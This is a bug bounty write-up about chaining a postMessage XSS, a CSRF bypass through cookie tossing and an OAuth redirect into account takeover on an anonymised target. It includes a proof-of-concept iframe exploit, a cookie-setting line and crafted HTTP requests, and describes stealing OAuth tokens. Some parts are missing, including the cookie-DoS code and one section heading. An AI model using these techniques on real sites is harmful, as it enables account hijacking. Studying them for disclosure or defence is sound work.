I am writing this article about a chain of xss that I found in a private hackerone BBP which lead to ATO. I chained multiple issues including a postmessage xss with a post based xss and oauth to achieve Account takeover.

1. Initial postmessage xss

The scope of the program was a wildcard so I was going through some of the subdomains. In one of the subdomains smth like account-cn.target.com, I noticed a possibly dangerous postmessage handler in which it was directly setting the location.href property to any arbitary message. Simplified version of the vulnerable code:

function handleMessage(t) {
  if (typeof t.data !== "string") return;

  const { action, payload } = JSON.parse(decodeURIComponent(t.data));

  if (action === Xl.somestring && ef) {
    nf.href = payload?.url || "";
  }
}

At first, I wanted to make sure that the nf referred to the actual window So I went through the code flow using the debugger of chrome and surely enough, it was indeed referring to the window. Now, I just needed to make the condition of the if block evaluate to true and I'll get the xss.

The first condition was pretty straightforward and it simply checked if the incoming message included a value named action and compared it with the value of X1.somestring(X1.somestring simply returned 'somestring')

Now, onto the second condition ef. While analyzing the code flow, I observed the it was being set to false by default and I searched thorughout the js file to find out where it was being set. Finally, I found the line where it was setting the value of ef. The code was similar to this:

ef = location.href.indexOf('something') > - 1

This simply checked if the url contained something parameter in the url, so we can satisfy this condition by simply including the parameter.

https://account-cn.target.com/?something=whatever

Finally, I made the xss popup by simply opening the url in an iframe and sending the message to the iframe after it has been loaded. Exploit code looked similar to this: 


<iframe
  id="myIframe"
  src="https://account.target.com?something=whatever"
>
</iframe>

<script>
  const iframe = document.getElementById("myIframe");

  const message2 = {
    action: "somestring",
    payload: {
      url: "javascript:alert(document.domain)"
    }
  };

  const encodedData2 = encodeURIComponent(JSON.stringify(message2));

  // Send message immediately after iframe loads
  iframe.addEventListener("load", () => {
    iframe.contentWindow.postMessage(encodedData2, "*");
  });
</script>

and the xss popped,

Upon some further analysis, I realized that the target was using a classic csrf protection defense. So, what it did was simply compare the value of the csrf token in the url with the csrf token present in the cookie

GET /submit?problemType=big%20problem&firstName=test&lastName=test&contactMobile=23324234&contactEmail=test%40gmail.com&promise=true&requestId=0z4uvdqlpr5l3ad01nhw&type=withoutAccount&_csrf_token_=must_be_same HTTP/1.1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0

This csrf token was being set when the user first visited the site. I tried some basic ways to bypass this protection but nothing was working. So, this was pretty much a self-xss since there was no way for me to know the value of this token beforehand :)

3. Bypassing the csrf protection

Luckily I had the postmessage xss on one of the subdomains of the target. So, I could just set a csrf cookie with the path attribute and then include that same value in the exploit url which would finally bypass the csrf protection.

document.cookie = 'csrf_token=haha; domain=.target.com; path=/submit/' ;

When the path attribute is included, it will take precedence over other cookies with the same name for that specific path. Since the target would have already set the csrf cookie, I had to use the path attribute to make sure that the target would use my attacker set cookie instead of the other one.

Now, when the victim opened the exploit url, following request will be sent: 

GET /submit?problemType=big%20problem&firstName=test&lastName=test&contactMobile=23324234&contactEmail=test%40gmail.com&promise=true&requestId=0z4uvdqlpr5l3ad01nhw&type=withoutAccount&_csrf_token_=i_was_set_by_attacker HTTP/1.1
Host: account.target.com
Cookie: _csrf_token=i_was_set_by_attacker;  _csrf_token=i_was_set_by_target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0

4. Chaining with oauth to get Account takeover

Now that we have our xss on the same domain that handles the oauth response, getting the ATO is pretty straightforward. In high level view, we can just cookie dos the account.target.com host -> open the oauth page -> returns to account.target.com with the access token -> host is down, just read the location.href property thrugh the reference since we have the xss on the same origin.

Js code used for cookie dos:

Final exploit flow:

1. First we open the page vulnerable to postmessage xss using window.open with the reference let's say b and send the postmessage xss which sets the csrf cookie with path attribute.

2. In the same postmessage payload, also change the window.location.href property to https://account.target.com/submit?contactMobile=23324234&contactEmail=test%40gmail.com&requestId=<xss_payload>&type=withoutAccount&_csrf_token_=i_was_set_by_attacker after the csrf_cookie has been set

3. Now, Since the cookie and url have the same value of csrf token, csrf error will not be triggered and the value of requestId will be reflected
